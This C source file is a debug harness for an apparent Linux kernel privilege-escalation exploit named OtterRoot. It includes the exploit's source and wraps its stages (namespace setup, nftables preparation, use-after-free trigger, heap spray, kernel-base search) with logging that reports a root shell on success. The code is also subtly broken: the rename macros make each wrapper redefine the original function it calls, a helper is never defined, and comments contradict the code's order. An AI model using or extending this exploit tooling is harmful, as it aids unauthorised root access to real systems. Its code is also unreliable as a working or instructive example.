/*
 * exploit_dbg.c – OtterRoot with verbose debugging helpers
 *
 *  This file is mechanically derived from exploit.c.  All exploitation
 *  primitives remain identical, but we sprinkle debug macros around the hot
 *  paths and compile it with AddressSanitizer & frame-pointers to ease
 *  gdb/strace work.  Build via `make` (creates PoC_dbg).
 */

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/prctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <time.h>
#include <sys/syscall.h>

/* ----------- GLOBAL DEBUG MACROS --------------------------------------- */
#ifdef DEBUG_OTTER
#  define CLR_RED   "\033[1;31m"
#  define CLR_GRN   "\033[1;32m"
#  define CLR_YEL   "\033[1;33m"
#  define CLR_CYN   "\033[1;36m"
#  define CLR_RST   "\033[0m"

#  define DBG(fmt, ...)                                                         \
     fprintf(stderr, CLR_CYN "[DBG] %-24s:%-4d " CLR_RST fmt "\n",            \
             __func__, __LINE__, ##__VA_ARGS__)

#  define CHECK(call, msg)  do {                                               \
        if ((call) < 0)                                                        \
            err(1, "%s", msg);                                               \
    } while (0)

#  define RET_FAIL(msg) errx(1, "%s", msg)
#  define LOUD_SUCCESS(fmt, ...)                                               \
     fprintf(stderr, CLR_GRN "[OK] " fmt CLR_RST "\n", ##__VA_ARGS__)
#  define LOUD_FAIL(fmt, ...)                                                  \
     fprintf(stderr, CLR_RED "[!!] " fmt CLR_RST "\n", ##__VA_ARGS__)
#  define LOUD_WARN(fmt, ...)                                                  \
     fprintf(stderr, CLR_YEL "[??] " fmt CLR_RST "\n", ##__VA_ARGS__)
#  define GUARD_ITER(i, limit, msg)  do { if ((i) >= (limit)) RET_FAIL(msg); } while(0)
#else
#  define DBG(...)     do {} while (0)
#  define CHECK(c, m)  (void)(c)
#  define RET_FAIL(m)  do { (void)(m); } while (0)
#  define LOUD_SUCCESS(...) do{}while(0)
#  define LOUD_FAIL(...) do{}while(0)
#  define LOUD_WARN(...) do{}while(0)
#  define GUARD_ITER(i,l,m) do{}while(0)
#endif

/* Replace every perror() with err() to exit on failure and keep single code
 * path – this must be defined *before* including the original source so it
 * affects all calls there. */
#define perror(msg) err(1, "%s", msg)

/* Pull in the original implementation ------------------------------------- */
/*  We #include the original source so that we can lightly wrap only the most
 *  important functions without having to keep two full copies in sync.  The
 *  wrapper implementations come *before* the include, so the original names
 *  are renamed to _orig and thin wrappers call + log them.
 */

/* Rename the original symbols so we can add wrappers with the public name */
#define unshare_setup        unshare_setup_orig
#define prepare_nftables     prepare_nftables_orig
#define trigger_uaf          trigger_uaf_orig
#define udata_spray          udata_spray_orig
#define deludata_spray       deludata_spray_orig
#define getudata             getudata_orig
#define is_kernel_base       is_kernel_base_orig
#define exploit              exploit_orig

/* also rename library-like calls we wish to wrap for logging */
#define mnl_socket_sendto    mnl_socket_sendto_orig
#define mnl_socket_recvfrom  mnl_socket_recvfrom_orig

/* syscalls */
#define open   open_orig
#define close  close_orig
#define lseek  lseek_orig
#define fcntl  fcntl_orig
#define dup    dup_orig
#define memfd_create memfd_create_orig

#include "exploit.c"

/* ---------------- WRAPPER IMPLEMENTATIONS ------------------------------- */
static void unshare_setup(uid_t uid, gid_t gid)
{
    DBG("→ unshare_setup(uid=%d, gid=%d)", uid, gid);
    unshare_setup_orig(uid, gid);
    DBG("← unshare_setup() done");
}

static void prepare_nftables(struct mnl_socket *nl)
{
    DBG("→ prepare_nftables() – nl socket=%p", (void *)nl);
    prepare_nftables_orig(nl);
    DBG("← prepare_nftables() done");
}

static void trigger_uaf(struct mnl_socket *nl, size_t size, int *msgqids)
{
    DBG("→ trigger_uaf(size=0x%zx)", size);
    trigger_uaf_orig(nl, size, msgqids);
    DBG("← trigger_uaf() done");
}

static void udata_spray(struct mnl_socket *nl, uint32_t sz, uint32_t start,
                        uint32_t cnt, void *data)
{
    DBG("udata_spray(size=%u start=%u cnt=%u data=%p)", sz, start, cnt, data);
    udata_spray_orig(nl, sz, start, cnt, data);
}

static void deludata_spray(struct mnl_socket *nl, uint32_t start, uint32_t cnt)
{
    DBG("deludata_spray(start=%u cnt=%u)", start, cnt);
    deludata_spray_orig(nl, start, cnt);
}

static char *getudata(struct mnl_socket *nl, char *table_name)
{
    DBG("getudata(table=%s)", table_name);
    char *r = getudata_orig(nl, table_name);
    DBG("getudata() returned buffer @%p (first byte=0x%02x)", r, r ? (unsigned)*r : 0);
    return r;
}

/* The exploit() wrapper is a little noisier because it's the main state
 * machine.  We only add high-level breadcrumbs so the log remains readable.
 */
static int exploit(int argc, char **argv)
{
    DBG("===== exploit() ENTRY =====");
    int ret = exploit_orig(argc, argv);
    if (ret == 0) {
        LOUD_SUCCESS("exploit() finished with root shell (ret=%d)", ret);
    } else {
        LOUD_FAIL("exploit() failed (ret=%d)", ret);
    }
    DBG("===== exploit() EXIT =====");
    return ret;
}

/* main() is pulled from exploit.c unchanged – we don't need an extra wrapper */

/* End of file */

/* ------------------------------------------------------------------------ */
/* Additional wrappers for low-level helpers                                 */

#ifdef DEBUG_OTTER

/* open/close/lseek/fcntl/dup/memfd_create wrappers */
#define WRAP_SYS_RET_NEG1(name, syscall_no, rettype, argsdecl, argspass)       \
    static inline rettype dbg_##name argsdecl {                               \
        rettype r = syscall(syscall_no, argspass);                            \
        DBG(#name "(" #argspass ") -> %ld %s", (long)r,                    \
            r == (rettype)-1 ? errstr() : "");                              \
        return r;                                                             \
    }

WRAP_SYS_RET_NEG1(open,  SYS_openat, int,  (const char *p, int f, mode_t m),  (AT_FDCWD, p, f, m))
WRAP_SYS_RET_NEG1(close, SYS_close,  int,  (int fd),                         (fd))
WRAP_SYS_RET_NEG1(lseek, SYS_lseek,  off_t,(int fd, off_t o, int wh),        (fd, o, wh))
WRAP_SYS_RET_NEG1(fcntl, SYS_fcntl,  int,  (int fd, int cmd, long arg),      (fd, cmd, arg))
WRAP_SYS_RET_NEG1(dup,   SYS_dup,    int,  (int fd),                         (fd))

static inline int dbg_memfd_create(const char *name, unsigned flags)
{
    int r = syscall(SYS_memfd_create, name, flags);
    DBG("memfd_create(flags=%u) -> %d %s", flags, r, r==-1?errstr():"");
    return r;
}

/* Replace symbols back to public names */
#undef open
#define open dbg_open
#undef close
#define close dbg_close
#undef lseek
#define lseek dbg_lseek
#undef fcntl
#define fcntl dbg_fcntl
#undef dup
#define dup dbg_dup
#undef memfd_create
#define memfd_create dbg_memfd_create

/* mnl_socket wrappers */
static inline int dbg_mnl_socket_sendto(struct mnl_socket *nl, const void *buf, size_t len)
{
    int r = mnl_socket_sendto_orig(nl, buf, len);
    DBG("mnl_socket_sendto(len=%zu) -> %d", len, r);
    if (r == -1) err(1, "mnl_socket_sendto");
    return r;
}

static inline int dbg_mnl_socket_recvfrom(struct mnl_socket *nl, void *buf, size_t len)
{
    int r = mnl_socket_recvfrom_orig(nl, buf, len);
    DBG("mnl_socket_recvfrom(len=%zu) -> %d", len, r);
    if (r == -1 && errno != EAGAIN) err(1, "mnl_socket_recvfrom");
    return r;
}

#undef mnl_socket_sendto
#define mnl_socket_sendto dbg_mnl_socket_sendto
#undef mnl_socket_recvfrom
#define mnl_socket_recvfrom dbg_mnl_socket_recvfrom

/* Loop guard & impossible state in is_kernel_base */
static bool is_kernel_base(unsigned char *addr)
{
    static uint64_t call_count = 0;
    call_count++;
    GUARD_ITER(call_count, 100000000ULL, "is_kernel_base() excessive calls");

    bool ret = is_kernel_base_orig(addr);
    if (ret && !addr)     // impossible state example
        RET_FAIL("is_kernel_base returned true for NULL addr");
    return ret;
}

#endif /* DEBUG_OTTER */